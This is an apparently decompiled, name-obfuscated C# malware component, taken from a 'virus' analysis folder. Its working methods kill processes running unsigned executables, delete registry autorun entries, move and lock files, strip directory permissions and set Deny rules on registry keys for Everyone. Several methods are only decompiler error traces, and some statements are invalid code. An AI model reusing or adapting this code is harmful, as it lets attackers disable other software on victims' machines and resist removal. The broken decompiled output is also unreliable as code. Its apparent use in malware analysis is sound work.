using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Windows.Forms;

[StandardModule]
internal sealed class _________________________________________________
{
	private static int _;

	private static int __;

	static _________________________________________________()
	{
		_________________________________________________._ = 0;
		_________________________________________________.__ = 0;
	}

	public static object ___()
	{
		// 
		// Current member / type: System.Object _________________________________________________::___()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Object ___()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static object ____(RegistryKey registryKey_0)
	{
		object obj = null;
		try
		{
			SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
			string str = (securityIdentifier.Translate(typeof(NTAccount)) as NTAccount).ToString();
			RegistrySecurity registrySecurity = new RegistrySecurity();
			registrySecurity.AddAccessRule(new RegistryAccessRule(str, RegistryRights.ExecuteKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
			registrySecurity.AddAccessRule(new RegistryAccessRule(str, RegistryRights.Delete | RegistryRights.ChangePermissions | RegistryRights.TakeOwnership, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
			registryKey_0.SetAccessControl(registrySecurity);
			registryKey_0.Close();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
		return obj;
	}

	public static void _____()
	{
		// 
		// Current member / type: System.Void _________________________________________________::_____()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void _____()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void ______()
	{
		// 
		// Current member / type: System.Void _________________________________________________::______()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void ______()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void _______(int int_0, bool bool_0 = false)
	{
		try
		{
			Process processById = Process.GetProcessById(int_0);
			if (processById != null)
			{
				processById.Kill();
				if (bool_0)
				{
					_________________________________________________.___________(processById.MainModule.FileName);
				}
				______________________________________________________________.______________(<Module>.____<string>(-899364305), string.Concat(<Module>.____<string>(-1866061636), int_0.ToString()));
			}
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>.___<string>(1387161447), string.Concat(<Module>.___<string>(-731293550), int_0.ToString(), <Module>.____<string>(-959412887), exception.ToString()));
			ProjectData.ClearProjectError();
		}
	}

	public static void ________()
	{
		try
		{
			____________________________________________________________.____(Environment.GetEnvironmentVariable(<Module>.____<string>(-14491992)));
			____________________________________________________________.____(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
			Process[] processes = Process.GetProcesses();
			int length = checked((int)processes.Length) - 1;
			for (int i = 0; i <= length; i++)
			{
				Process process = processes[i];
				try
				{
					string fullPath = Path.GetFullPath(process.MainModule.FileName);
					if (_________________________________________________.__________(fullPath) && !_________________________________________________.____________(process.MainWindowTitle))
					{
						_________________________________________________.________________(fullPath);
						try
						{
							process.Kill();
							_________________________________________________._ = _________________________________________________._ + 1;
						}
						catch (Exception exception)
						{
							ProjectData.SetProjectError(exception);
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception exception1)
				{
					ProjectData.SetProjectError(exception1);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception exception2)
		{
			ProjectData.SetProjectError(exception2);
			ProjectData.ClearProjectError();
		}
	}

	public static bool _________()
	{
		bool flag;
		try
		{
			flag = (!_________________________________________________.___________________________________________________________.__(Application.ExecutablePath) ? false : true);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			flag = false;
			ProjectData.ClearProjectError();
		}
		return flag;
	}

	public static bool __________(string string_0)
	{
		// 
		// Current member / type: System.Boolean _________________________________________________::__________(System.String)
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Boolean __________(System.String)
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void ___________(string string_0)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
			DirectorySecurity directorySecurity = new DirectorySecurity();
			directorySecurity.SetAccessRuleProtection(true, false);
			directoryInfo.SetAccessControl(directorySecurity);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static bool ____________(string string_0)
	{
		bool flag;
		try
		{
			flag = _________________________________________________.IsWindowVisible(_________________________________________________.FindWindow(null, string_0));
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			flag = false;
			ProjectData.ClearProjectError();
		}
		return flag;
	}

	public static void _____________()
	{
		// 
		// Current member / type: System.Void _________________________________________________::_____________()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void _____________()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void ______________(string string_0, int int_0)
	{
		string str;
		RegistryKey registryKey = null;
		string[] strArrays = null;
		object length;
		try
		{
			if (int_0 == 1)
			{
				registryKey = Registry.CurrentUser.OpenSubKey(string_0);
				switch (Type.EmptyTypes.Length)
				{

				}
			}
			if (int_0 == 2)
			{
				registryKey = Registry.LocalMachine.OpenSubKey(string_0);
			}
			string[] valueNames = registryKey.GetValueNames();
			for (int i = 0; i < checked((int)valueNames.Length); i++)
			{
				string str1 = valueNames[i];
				try
				{
					str = registryKey.GetValue(str1).ToString();
					if (str.Contains(<Module>.____<string>(-606320000)))
					{
						if (str.Contains(<Module>._____<string>(1419880545)))
						{
							str.Replace(<Module>.___<string>(-277122768), string.Empty);
						}
						try
						{
							string[] strArrays1 = Strings.Split(str, <Module>.______<string>(-429170557), -1, CompareMethod.Binary);
							str = strArrays1[0];
						}
						catch (Exception exception)
						{
							ProjectData.SetProjectError(exception);
							ProjectData.ClearProjectError();
						}
					}
					-5832 == (1820327936 * <Module>._______________ == -2627 ? Type.EmptyTypes.Length + -1287567016 : -5833);
					if (!str.Contains(<Module>.___<string>(-277122768)))
					{
						goto Label0;
					}
					strArrays = str.Split(new char[] { '\"' });
					length = Type.EmptyTypes.Length + 0;
				Label3:
					switch (length)
					{
						case 1:
						{
							if (str.Contains(Application.ExecutablePath))
							{
								break;
							}
							_________________________________________________._______________(int_0, str1, string_0, str);
							if (!_________________________________________________.__________(str))
							{
								break;
							}
							_________________________________________________.__ = _________________________________________________.__ + 1;
							_________________________________________________.________________(str);
							break;
						}
						default:
						{
							str = strArrays[1];
							goto Label0;
						}
					}
				}
				catch (Exception exception1)
				{
					ProjectData.SetProjectError(exception1);
					ProjectData.ClearProjectError();
				}
			Label1:
			}
		}
		catch (Exception exception2)
		{
			ProjectData.SetProjectError(exception2);
			ProjectData.ClearProjectError();
		}
		return;
	Label0:
		if (str.Contains(_____________________________________________________________________________.__))
		{
			goto Label1;
		}
		length = sizeof(byte) + 0;
		goto Label3;
	}

	public static void _______________(int int_0, string string_0, string string_1, string string_2)
	{
		try
		{
			string string1 = string_1;
			RegistryKey registryKey = null;
			registryKey = (int_0 != 1 ? Registry.LocalMachine.OpenSubKey(string1, true) : Registry.CurrentUser.OpenSubKey(string1, true));
			using (registryKey)
			{
				if (registryKey != null)
				{
					registryKey.DeleteValue(string_0);
				}
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void ________________(string string_0)
	{
		try
		{
			if (File.Exists(string_0))
			{
				Random random = new Random();
				try
				{
					if (___________________________________________________________________.________())
					{
						string str = string.Concat(Path.GetTempPath(), Conversions.ToString(random.Next(1000, 9000)));
						_________________________________________________.MoveFileExA(ref string_0, ref str, 4L);
					}
				}
				catch (Exception exception)
				{
					ProjectData.SetProjectError(exception);
					ProjectData.ClearProjectError();
				}
				try
				{
					_____________________________________________________________________________._______________(string_0);
					_____________._.FileSystem.MoveFile(string_0, string.Concat(Path.GetTempPath(), Conversions.ToString(random.Next(1000, 9000))));
					File.WriteAllText(string_0, string.Empty);
					FileSystem.FileOpen(FileSystem.FreeFile(), string_0, OpenMode.Input, OpenAccess.Default, OpenShare.LockReadWrite, -1);
				}
				catch (Exception exception1)
				{
					ProjectData.SetProjectError(exception1);
					_________________________________________________.___________(string_0);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception exception2)
		{
			ProjectData.SetProjectError(exception2);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=false, SetLastError=true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", CharSet=CharSet.None, ExactSpelling=false, SetLastError=true)]
	private static extern bool IsWindowVisible(IntPtr intptr_0);

	[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
	private static extern long MoveFileExA(ref string string_0, ref string string_1, long long_0);

	public enum __________________________________________________ : uint
	{
		_ = 1,
		__ = 2,
		___ = 3,
		____ = 4
	}

	public enum ___________________________________________________ : uint
	{
		_,
		__
	}

	public enum ____________________________________________________ : uint
	{
		_ = 1,
		__ = 2,
		___ = 3,
		____ = 4,
		_____ = 5
	}

	public enum _____________________________________________________ : uint
	{
		_,
		__,
		___,
		____,
		_____
	}

	[Flags]
	public enum ______________________________________________________ : uint
	{
		_ = 1,
		__ = 2,
		___ = 4,
		____ = 16,
		_____ = 32,
		______ = 64,
		_______ = 128,
		________ = 256,
		_________ = 512,
		__________ = 1024,
		___________ = 2048,
		____________ = 4096
	}

	public enum _______________________________________________________ : uint
	{
		_,
		__
	}

	public class ________________________________________________________
	{
		private int _;

		private IntPtr __;

		private IntPtr ___;

		private IntPtr ____;

		public ________________________________________________________(string string_0)
		{
			this._ = Marshal.SizeOf(typeof(_________________________________________________.________________________________________________________));
			this.___ = IntPtr.Zero;
			this.____ = IntPtr.Zero;
			this.__ = Marshal.StringToCoTaskMemAuto(string_0);
		}

		protected override void System.Object.Finalize()
		{
			try
			{
				Marshal.FreeCoTaskMem(this.__);
			}
			finally
			{
				this.Finalize();
			}
		}
	}

	public class _________________________________________________________
	{
		private int _;

		private IntPtr __;

		private IntPtr ___;

		private _________________________________________________.__________________________________________________ ____;

		private _________________________________________________.___________________________________________________ _____;

		private _________________________________________________.____________________________________________________ ______;

		private IntPtr _______;

		private _________________________________________________._____________________________________________________ ________;

		private IntPtr _________;

		private string __________;

		private _________________________________________________.______________________________________________________ ___________;

		private _________________________________________________._______________________________________________________ ____________;

		public _________________________________________________________(string string_0)
		{
			int num;
			this._ = Marshal.SizeOf(typeof(_________________________________________________._________________________________________________________));
			int num1 = (int)(sizeof(Guid) + -26193);
			switch (checked((int)0))
			{
				default:
				{
					this.__ = IntPtr.Zero;
					this.___ = IntPtr.Zero;
					this.____ = _________________________________________________.__________________________________________________.__;
					num = num1;
					num1 = -596;
					break;
				}
			}
			num == -26177;
			this._____ = _________________________________________________.___________________________________________________._;
			<Module>._______________ = 1203310366;
			this.______ = _________________________________________________.____________________________________________________._;
			if (num1 == 7441)
			{
				(3045 ^ num1 + 7129) * 16 + -124208 != 5 * num1 + num1 * 11;
			}
			this.________ = _________________________________________________._____________________________________________________._;
			this._________ = IntPtr.Zero;
			this.__________ = null;
			this.___________ = _________________________________________________.______________________________________________________.________;
			this.____________ = _________________________________________________._______________________________________________________._;
			_________________________________________________.________________________________________________________ _____________________________ = new _________________________________________________.________________________________________________________(string_0);
			this._______ = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(_________________________________________________.________________________________________________________)));
			Marshal.StructureToPtr(_____________________________, this._______, false);
		}

		protected override void System.Object.Finalize()
		{
			try
			{
				Marshal.FreeCoTaskMem(this._______);
			}
			finally
			{
				this.Finalize();
			}
		}
	}

	public enum __________________________________________________________
	{
		__ = -2146762751,
		___ = -2146762750,
		____ = -2146762749,
		_____ = -2146762748,
		_ = 0
	}

	public sealed class ___________________________________________________________
	{
		private readonly static IntPtr _;

		private const string __ = "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}";

		static ___________________________________________________________()
		{
			_________________________________________________.___________________________________________________________._ = new IntPtr(-1);
		}

		private ___________________________________________________________()
		{
		}

		public static bool __(string string_0)
		{
			bool flag;
			try
			{
				_________________________________________________._________________________________________________________ _____________________________ = new _________________________________________________._________________________________________________________(string_0);
				Guid guid = new Guid(<Module>.______<string>(-2083206735));
				_________________________________________________.__________________________________________________________ ______________________________ = _________________________________________________.___________________________________________________________.WinVerifyTrust(_________________________________________________.___________________________________________________________._, guid, _____________________________);
				flag = ______________________________ == _________________________________________________.__________________________________________________________._;
			}
			catch (Exception exception)
			{
				ProjectData.SetProjectError(exception);
				flag = false;
				ProjectData.ClearProjectError();
			}
			return flag;
		}

		[DllImport("wintrust.dll", CharSet=CharSet.Unicode, ExactSpelling=true)]
		private static extern _________________________________________________.__________________________________________________________ WinVerifyTrust([In] IntPtr intptr_0, [In] Guid guid_0, [In] _________________________________________________._________________________________________________________ __________________________________________________________0);
	}
}